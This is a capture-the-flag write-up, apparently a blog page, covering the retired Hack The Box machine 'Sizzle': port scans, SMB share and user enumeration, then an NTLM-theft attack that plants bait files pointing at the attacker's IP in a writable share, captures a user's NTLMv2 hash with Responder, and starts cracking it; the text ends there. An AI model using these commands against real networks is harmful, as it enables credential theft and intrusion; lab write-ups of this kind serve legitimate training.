@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Sizzle | Paracausal Telemetry</title><meta name="description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Department Shares, Watering hole attack." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sizzle/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Sizzle" /><meta property="og:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Department Shares, Watering hole attack." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sizzle/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sizzle/og.png?v=5e93a1a8" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Sizzle" /><meta name="twitter:description" content="Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Department Shares, Watering hole attack." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sizzle/og.png?v=5e93a1a8" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Sizzle","description":"Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Department Shares, Watering hole attack.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sizzle/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Sizzle","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-sizzle/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Sizzle</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 10 min read</p><h1>Sizzle</h1><p>Insane Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), Department Shares, Watering hole attack.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · insane</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Sizzle" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-sizzle.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-sizzle.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Sizzle</h2><p>Sizzle is an &amp;amp;quot;Insane&amp;amp;quot; difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using…</p></div><span class="room-badge room-badge-insane">Insane</span></div><dl class="room-facts"><div><dt>Released</dt><dd>12 Jan 2019</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creators</dt><dd>mrb3n8132, lkys37en</dd></div><div><dt>Rating</dt><dd>4.9 / 5</dd></div><div><dt>User owns</dt><dd>2,654</dd></div><div><dt>Root owns</dt><dd>2,684</dd></div><div><dt>User blood</dt><dd>stefano118<small class="room-blood-time">17H 59M 56S</small></dd></div><div><dt>Root blood</dt><dd>stefano118<small class="room-blood-time">18H 37M 15S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 3577 votes from easiest to hardest"><rect x="0" y="54" width="20" height="10" rx="2" fill="hsl(96 70% 55%)"><title>109 votes</title></rect><rect x="26" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>39 votes</title></rect><rect x="52" y="54" width="20" height="10" rx="2" fill="hsl(80 70% 55%)"><title>109 votes</title></rect><rect x="78" y="54" width="20" height="10" rx="2" fill="hsl(70 70% 55%)"><title>106 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>674 votes</title></rect><rect x="130" y="44" width="20" height="20" rx="2" fill="hsl(38 70% 55%)"><title>209 votes</title></rect><rect x="156" y="7" width="20" height="57" rx="2" fill="hsl(28 70% 55%)"><title>603 votes</title></rect><rect x="182" y="1" width="20" height="63" rx="2" fill="hsl(16 70% 55%)"><title>664 votes</title></rect><rect x="208" y="16" width="20" height="48" rx="2" fill="hsl(8 70% 55%)"><title>507 votes</title></rect><rect x="234" y="11" width="20" height="53" rx="2" fill="hsl(0 70% 55%)"><title>557 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.5, Real-Life 8.5, CVE 6.2, Custom Exploitation 3.8, CTF-Like 1.5"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,50.5 166.6,91.6 135.5,145.1 94.4,131.5 100.0,106.8" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Sizzle" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.19.191 --generate-hosts-file /etc/hosts
+[sudo] password for kali: 
+SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><ul><li>SMB signing is enabled</li><li>Null auth </li></ul><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT -Pn 10.129.19.191                                                       
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 16:09 +0100
+Nmap scan report for 10.129.19.191
+Host is up (0.014s latency).
+Not shown: 65507 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+53/tcp    open  domain
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49668/tcp open  unknown
+49673/tcp open  unknown
+49688/tcp open  unknown
+49689/tcp open  unknown
+49692/tcp open  unknown
+49695/tcp open  unknown
+49710/tcp open  unknown
+49720/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.19 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389 -A --min-rate=2000 -sT -Pn sizzle.htb.local
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 16:13 +0100
+Nmap scan report for sizzle.htb.local (10.129.19.191)
+Host is up (0.014s latency).
+rDNS record for 10.129.19.191: SIZZLE.HTB.LOCAL
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn&#39;t have a title (text/html).
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2021-02-11T12:59:51
+|_Not valid after:  2022-02-11T12:59:51
+|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
+443/tcp  open  ssl/https?
+|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2021-02-11T12:59:51
+|_Not valid after:  2022-02-11T12:59:51
+|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2021-02-11T12:59:51
+|_Not valid after:  2022-02-11T12:59:51
+3269/tcp open  ssl/ldap
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2021-02-11T12:59:51
+|_Not valid after:  2022-02-11T12:59:51
+|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp open  ssl/wsmans?
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2021-02-11T12:59:51
+|_Not valid after:  2022-02-11T12:59:51
+|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
+Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth enabled but not able to use it to enumerate shares or users</p><h3>Guest access</h3><h4>Shares</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb sizzle.htb.local -u &#39;Guest&#39; -p &#39;&#39; --shares
+SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\Guest: 
+SMB         10.129.19.191   445    SIZZLE           [*] Enumerated shares
+SMB         10.129.19.191   445    SIZZLE           Share           Permissions     Remark
+SMB         10.129.19.191   445    SIZZLE           -----           -----------     ------
+SMB         10.129.19.191   445    SIZZLE           ADMIN$                          Remote Admin
+SMB         10.129.19.191   445    SIZZLE           C$                              Default share
+SMB         10.129.19.191   445    SIZZLE           CertEnroll                      Active Directory Certificate Services share
+SMB         10.129.19.191   445    SIZZLE           Department Shares READ            
+SMB         10.129.19.191   445    SIZZLE           IPC$            READ            Remote IPC
+SMB         10.129.19.191   445    SIZZLE           NETLOGON                        Logon server share 
+SMB         10.129.19.191   445    SIZZLE           Operations                      
+SMB         10.129.19.191   445    SIZZLE           SYSVOL                          Logon server share</code></pre><p>Read access on <code>Department Shares</code> and <code>IPC$</code></p><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb sizzle.htb.local -u &#39;Guest&#39; -p &#39;&#39; --rid-brute 20000
+SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\Guest: 
+SMB         10.129.19.191   445    SIZZLE           498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           500: HTB\Administrator (SidTypeUser)
+SMB         10.129.19.191   445    SIZZLE           501: HTB\Guest (SidTypeUser)
+SMB         10.129.19.191   445    SIZZLE           502: HTB\krbtgt (SidTypeUser)
+SMB         10.129.19.191   445    SIZZLE           503: HTB\DefaultAccount (SidTypeUser)
+SMB         10.129.19.191   445    SIZZLE           512: HTB\Domain Admins (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           513: HTB\Domain Users (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           514: HTB\Domain Guests (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           515: HTB\Domain Computers (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           516: HTB\Domain Controllers (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           517: HTB\Cert Publishers (SidTypeAlias)
+SMB         10.129.19.191   445    SIZZLE           518: HTB\Schema Admins (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           519: HTB\Enterprise Admins (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           520: HTB\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           521: HTB\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           522: HTB\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           525: HTB\Protected Users (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           526: HTB\Key Admins (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           527: HTB\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           553: HTB\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.19.191   445    SIZZLE           571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.19.191   445    SIZZLE           572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.19.191   445    SIZZLE           1001: HTB\SIZZLE$ (SidTypeUser)
+SMB         10.129.19.191   445    SIZZLE           1102: HTB\DnsAdmins (SidTypeAlias)
+SMB         10.129.19.191   445    SIZZLE           1103: HTB\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.19.191   445    SIZZLE           1104: HTB\amanda (SidTypeUser)
+SMB         10.129.19.191   445    SIZZLE           1603: HTB\mrlky (SidTypeUser)
+SMB         10.129.19.191   445    SIZZLE           1604: HTB\sizzler (SidTypeUser)</code></pre><p>Found all the users</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb sizzle.htb.local -u &#39;Guest&#39; -p &#39;&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 &gt; users.txt</code></pre><p>Ive re-ran this using some extra commands to pull the users out of the output</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat users.txt   
+Administrator
+Guest
+krbtgt
+DefaultAccount
+SIZZLE$
+amanda
+mrlky
+sizzler</code></pre><p>All the users</p><h2><code>Department Shares</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //sizzle.htb.local/&#39;Department Shares&#39; -U &#39;Guest&#39;%&#39;&#39;                                         
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Jul  3 16:22:32 2018
+  ..                                  D        0  Tue Jul  3 16:22:32 2018
+  Accounting                          D        0  Mon Jul  2 20:21:43 2018
+  Audit                               D        0  Mon Jul  2 20:14:28 2018
+  Banking                             D        0  Tue Jul  3 16:22:39 2018
+  CEO_protected                       D        0  Mon Jul  2 20:15:01 2018
+  Devops                              D        0  Mon Jul  2 20:19:33 2018
+  Finance                             D        0  Mon Jul  2 20:11:57 2018
+  HR                                  D        0  Mon Jul  2 20:16:11 2018
+  Infosec                             D        0  Mon Jul  2 20:14:24 2018
+  Infrastructure                      D        0  Mon Jul  2 20:13:59 2018
+  IT                                  D        0  Mon Jul  2 20:12:04 2018
+  Legal                               D        0  Mon Jul  2 20:12:09 2018
+  M&amp;A                                 D        0  Mon Jul  2 20:15:25 2018
+  Marketing                           D        0  Mon Jul  2 20:14:43 2018
+  R&amp;D                                 D        0  Mon Jul  2 20:11:47 2018
+  Sales                               D        0  Mon Jul  2 20:14:37 2018
+  Security                            D        0  Mon Jul  2 20:21:47 2018
+  Tax                                 D        0  Mon Jul  2 20:16:54 2018
+  Users                               D        0  Tue Jul 10 22:39:32 2018
+  ZZ_ARCHIVE                          D        0  Mon Jul  2 20:32:58 2018
+
+		7779839 blocks of size 4096. 3166383 blocks available
+smb: \&gt;</code></pre><p>Only <code>Users</code> and <code>ZZ_ARCHIVE</code> and <code>Tax</code> contain data</p><p>The path <code>Users/Public/</code> is writable in SMB i can try a watering hole attack</p><h2>Watering hole attack</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 ntlm_theft.py -g all -s 10.10.14.90 -f meeting
+/home/kali/htb/Sizzle/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence &#39;\l&#39;
+  location.href = &#39;ms-word:ofe|u|\\&#39;&#39;&#39; + server + &#39;&#39;&#39;\leak\leak.docx&#39;;
+Created: meeting/meeting.scf (BROWSE TO FOLDER)
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Created: meeting/Autorun.inf (BROWSE TO FOLDER)
+Created: meeting/desktop.ini (BROWSE TO FOLDER)
+Created: meeting/meeting.theme (THEME TO INSTALL
+Generation Complete.</code></pre><p>First ill generate the files with my IP address inside</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>This started a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smb: \Users\Public\&gt; prompt off
+smb: \Users\Public\&gt; mput meeting*</code></pre><p>This planted the files in the share</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[SMB] NTLMv2-SSP Client   : 10.129.19.191
+[SMB] NTLMv2-SSP Username : HTB\amanda
+[SMB] NTLMv2-SSP Hash     : amanda::HTB:86c0335d88d43520:103EB57BE6B34F59ED9721CF15B92335:010100000000000080EE9EC0F4CCDC015EA13D572A34B0590000000002000800590058004400530001001E00570049004E002D004E004200490038003000390050004D0030003300590004003400570049004E002D004E004200490038003000390050004D003000330059002E0059005800440053002E004C004F00430041004C000300140059005800440053002E004C004F00430041004C000500140059005800440053002E004C004F00430041004C000700080080EE9EC0F4CCDC01060004000200000008003000300000000000000001000000002000007F8946A95DC4C9A5217BF48DC3C2A224BE254FAC65F2034534200E8F6F1797350A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0039003000000000000000000000000000
+[*] Skipping previously captured hash for HTB\amanda
+[*] Skipping previously captured hash for HTB\amanda</code></pre><p>Ive captured a hash</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat amanda.hash /usr/share/wordlists/rockyou.txt
+
+
